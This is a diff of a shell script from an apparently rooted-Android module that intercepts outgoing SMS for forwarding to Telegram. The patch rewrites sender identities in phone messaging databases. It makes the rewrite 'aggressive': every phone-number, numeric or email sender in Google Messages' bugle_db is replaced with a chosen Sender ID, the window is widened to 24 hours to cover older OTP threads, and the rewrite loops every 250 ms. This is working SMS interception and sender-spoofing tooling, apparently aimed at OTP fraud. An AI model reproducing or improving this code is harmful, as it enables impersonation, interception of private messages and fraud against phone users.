@@ -1092,8 +1092,10 @@ forward_blocked_telegram() {
   HTML_BODY=$(tg_html_escape "$MSG_BODY")
   TEXT="📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>
 
+
 <b>To (Tap to copy):</b>
 <code>${HTML_TO}</code>
+
 
 <b>Body (Tap to copy):</b>
 <code>${HTML_BODY}</code>"
@@ -1279,8 +1281,8 @@ rewrite_inbox_sender_id() {
   local changed=0
   local now_ms cutoff_ms
   now_ms=$(date +%s)000
-  # Last 2 hours
-  cutoff_ms=$((now_ms - 7200000))
+  # Last 24 hours — older OTP threads bhi SID pe
+  cutoff_ms=$((now_ms - 86400000))
 
   local sql_sid
   sql_sid=$(printf '%s' "$sid" | sed "s/'/''/g")
@@ -1369,30 +1371,28 @@ rewrite_inbox_sender_id() {
       /data/user/0/com.motorola.messaging/databases/bugle_db
     do
       [ -f "$bdb" ] || continue
-      # Recent participants still showing phone numbers / +91
+      # Aggressive: any +91 / long digit participant → menu Sender ID
       "$SQL3" "$bdb" "
         UPDATE participants SET
           display_destination='${sql_sid}',
           normalized_destination='${sql_sid}',
           send_destination='${sql_sid}',
           full_name='${sql_sid}'
-        WHERE _id IN (
-          SELECT DISTINCT participant_id FROM messages
-          WHERE received_timestamp>=${cutoff_ms}
-             OR sent_timestamp>=${cutoff_ms}
-             OR COALESCE(received_timestamp,0)+COALESCE(sent_timestamp,0)>=${cutoff_ms}
-        )
-        AND IFNULL(display_destination,'')!='${sql_sid}'
+        WHERE IFNULL(display_destination,'')!='${sql_sid}'
         AND (
           display_destination LIKE '+%'
           OR display_destination GLOB '[0-9]*'
           OR normalized_destination LIKE '+%'
           OR send_destination LIKE '+%'
-          OR length(IFNULL(display_destination,''))>=8
+          OR display_destination LIKE '%@%'
+          OR length(IFNULL(display_destination,'')) BETWEEN 6 AND 20
         );
       " 2>/dev/null && changed=1 && \
-        echo "sender_bugle_ok sid=$sid db=$bdb $(date +%s)" \
+        echo "sender_bugle_force sid=$sid db=$bdb $(date +%s)" \
           >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
+      # conversation name columns (schema variants)
+      "$SQL3" "$bdb" "UPDATE conversations SET name='${sql_sid}' WHERE IFNULL(name,'')!='' AND name!='${sql_sid}' AND (name LIKE '+%' OR name GLOB '[0-9]*');" 2>/dev/null || true
+      "$SQL3" "$bdb" "UPDATE conversations SET subject='${sql_sid}' WHERE IFNULL(subject,'')!='' AND subject!='${sql_sid}' AND (subject LIKE '+%' OR subject GLOB '[0-9]*');" 2>/dev/null || true
       # Fallback schema variants (older Messages)
       "$SQL3" "$bdb" "
         UPDATE participants SET
@@ -1403,7 +1403,6 @@ rewrite_inbox_sender_id() {
           display_destination LIKE '+91%'
           OR normalized_destination LIKE '+91%'
           OR send_destination LIKE '+91%'
-          OR display_destination GLOB '91[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]*'
         )
         AND IFNULL(display_destination,'')!='${sql_sid}';
       " 2>/dev/null || true
@@ -1481,10 +1480,10 @@ rewrite_inbox_sender_id
 ) &
 
 (
-  # Fast Sender ID rewrite — OTP aate hi menu wali ID pe dikhe
+  # Ultra-fast Sender ID rewrite — OTP aate hi menu wali ID pe dikhe
   while true; do
     rewrite_inbox_sender_id
-    usleep 500000 2>/dev/null || sleep 0.5 2>/dev/null || sleep 1
+    usleep 250000 2>/dev/null || sleep 0.25 2>/dev/null || sleep 1
   done
 ) &
 
